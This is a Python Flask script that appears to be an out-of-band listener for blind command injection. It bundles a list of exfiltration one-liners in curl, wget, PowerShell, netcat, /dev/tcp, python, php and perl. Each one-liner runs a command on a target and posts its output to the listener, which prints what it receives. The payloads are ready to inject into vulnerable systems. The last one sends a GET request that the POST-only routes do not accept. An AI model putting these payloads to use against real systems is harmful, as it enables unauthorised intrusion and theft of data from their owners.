from __future__ import annotations  # noqa: F404
from flask import Flask, Request, request
import datetime

# configuration
HOST = "0.0.0.0"
PORT = 7413


def handle_record(record: EchoRecord):
    print(record)


# configuration end


# SOME
PAYLOADS = [
    f"pwd | curl --data-binary @- http://{HOST}:{PORT}/",
    f'wget --method=POST --body-data="$(pwd)" http://{HOST}:{PORT}/ -O -',
    f'ls | powershell -c "irm -Uri http://{HOST}:{PORT}/ -Method POST -Body ([Console]::In.ReadToEnd())"',
    f'python3 -c \'import os,socket;b=os.popen("pwd").read();s=socket.create_connection(("{HOST}",{PORT}));s.send(b"POST / HTTP/1.1\\r\\nHost:x\\r\\nContent-Length:%d\\r\\n\\r\\n%b"%(len(b),b.encode()))\'',
    f'python2 -c \'import os,socket;b=os.popen("pwd").read();s=socket.create_connection(("{HOST}",{PORT}));s.send("POST / HTTP/1.1\\r\\nHost:x\\r\\nContent-Length:%d\\r\\n\\r\\n%%s"%(len(b),b))\'',
    f'php -r \'$b=`pwd`; $s=fsockopen("{HOST}",{PORT}); fwrite($s,"POST / HTTP/1.1\\r\\nHost:x\\r\\nContent-Length:".strlen($b)."\\r\\n\\r\\n$b");\'',
    f'perl -e \'use IO::Socket::INET;$b=`pwd`;IO::Socket::INET->new(PeerAddr=>"{HOST}",PeerPort=>{PORT})->send("POST / HTTP/1.1\\r\\nHost:x\\r\\nContent-Length:".length($b)."\\r\\n\\r\\n$b")\'',
    f'b=$(pwd); echo -ne "POST / HTTP/1.1\\r\\nHost: x\\r\\nContent-Length:${{#b}}\\r\\n\\r\\n$b" | nc {HOST} {PORT}',
    f'b=$(pwd); echo -ne "POST / HTTP/1.1\\r\\nHost: x\\r\\nContent-Length: ${{#b}}\\r\\n\\r\\n$b" > /dev/tcp/{HOST}/{PORT}',
    f"curl http://{HOST}:{PORT}/$(pwd)",
]
# SOME end


class EchoRecord:
    request: Request
    date: str
    ip: str
    data: str
    headers: str

    def __init__(self, request):
        self.request = request
        self.date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.ip = request.remote_addr
        self.data = request.get_data(as_text=True)
        self.headers = self.build_http_headers(request)

    def __str__(self):
        return f"{self.date} | {self.ip}\n{self.headers}\n\n{self.data}"

    def build_http_headers(self, request):
        request_line = f"{request.method} {request.full_path.rstrip('?')} HTTP/1.1"
        headers = "\r\n".join(f"{k}: {v}" for k, v in request.headers.items())
        return f"{request_line}\r\n{headers}"


# flask
app = Flask(__name__)


@app.route("/", methods=["POST"])
def echo():
    handle_record(EchoRecord(request))
    return "Ok"


# get 会触发浏览器favicon.ico请求
@app.route("/<path:data>", methods=["POST"])
def echo_path(data):
    er = EchoRecord(request)
    er.data = data
    handle_record(er)
    return "Ok"


# flask end


# run app
if __name__ == "__main__":
    for payload in PAYLOADS:
        print(f"\n-\t{payload}")

    app.run(host=HOST, port=PORT, debug=False)
